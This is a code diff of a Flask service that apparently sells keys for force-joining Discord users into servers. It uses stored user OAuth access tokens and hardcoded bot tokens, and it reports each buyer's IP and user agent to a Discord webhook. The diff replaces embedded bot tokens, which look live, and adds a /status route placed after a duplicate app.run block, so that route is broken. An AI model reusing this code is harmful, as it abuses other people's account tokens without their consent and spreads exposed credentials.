@@ -10,14 +10,14 @@ hook = Webhook("https://discord.com/api/webhooks/1118078324988710932/0jNWwqaDZHi
 os.system("clear")
 app = Flask(__name__)
 
-offline_token = 'MTExNjY2MjkyNTIxNDYxMzU1NQ.G6FfrQ.xJeJVVnMOkm9oJCAttEsyBEN0zJeziwHarIdDI'
-online_token = 'MTExNjY3ODgyNjEzOTg0ODgxMw.Gu-YjZ.JWEK05IMrXtHZ67BqCDkLMZUYJoELAiivFRMfk'
+offline_token = 'MTExODA2NzYzNDU4ODYxNDY4Ng.G1krKC.0ZRj486HoCkdZspXFUSG8RbrttkC-drPnbbtN4'
+online_token = 'MTExODQwOTgxODE2NDY5NTE3MA.GzOWCb.vhwqN71cotbF65ORxhm8yik_l-58Ltuj3UVyn0'
 
 API_ENDPOINT = 'https://canary.discord.com/api/v9'
 
 def update_join_count(guild_id, type:str):
   # return 0 
-    filename = f"guilds/{guild_id}-{type}.txt"
+    filename = f"guilds/{guild_id}.txt"
     try:
         with open(filename, "r") as f:
             count = int(f.read())
@@ -33,6 +33,7 @@ def update_join_count(guild_id, type:str):
         f.close()
     return count
 
+running_tasks = []
 
 def add_to_guild(access_token, userID , guild_Id, key_type):
     tkn = offline_token if key_type == 'offline' else online_token
@@ -81,6 +82,7 @@ def joiner(guild_id, key_type, start_from, amount):
                 count += 1
                 continue
             if count >= start_from + amount:
+                running_tasks.remove(guild_id)
                 break
             user_id, access_token, re = line.strip().split(':')
             ok = add_to_guild(access_token, user_id, guild_id, key_type)
@@ -115,7 +117,7 @@ def callback():
       key = request.args.get('state')  
     except:
       return "error"
-    ip = request.environ['HTTP_X_FORWARDED_FOR']
+    ip = request.remote_addr
     ua = request.headers.get('User-Agent')
     with open('keys.json', 'r') as f:
       keys_data = json.load(f)
@@ -140,6 +142,7 @@ def callback():
     try:
         Thread(target=joiner, args=(guild_id, key_type, start_from, amount)).start()
         uses_remaining -= 1
+        running_tasks.append(guild_id)
         em = Embed(description=f"Key used\nIP: {ip}\nUA: {ua}\nKey: {key}\nKey Type: {key_type}\nGuild: {guild_id}", color=00000)
         hook.send(embed=em)
         return jsonify({
@@ -154,5 +157,12 @@ def callback():
         print(e)
         hook.send(e)
         return jsonify({'error': 'Invalid guild'}), 400
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=1337)
+
+@app.route('/status')
+def status():
+        return jsonify(running_tasks), 200
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=1337)
